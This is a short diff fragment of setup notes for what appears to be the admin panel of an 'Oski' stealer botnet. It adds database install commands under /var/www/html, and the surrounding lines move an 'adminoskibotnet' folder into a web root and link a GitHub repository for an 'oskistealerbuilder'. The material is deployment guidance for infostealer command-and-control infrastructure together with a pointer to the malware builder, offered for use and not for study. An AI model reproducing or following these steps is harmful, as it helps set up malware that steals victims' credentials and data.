@@ -42,7 +42,8 @@ mv adminoskibotnet www
 browser http://host.com.ua.ru/www
 _________
 install
-
+cd /var/www/html/www
+mysql -u root -p oski < oski.sql
 _________
 builder
 https://github.com/h4ckti2/oskistealerbuilder
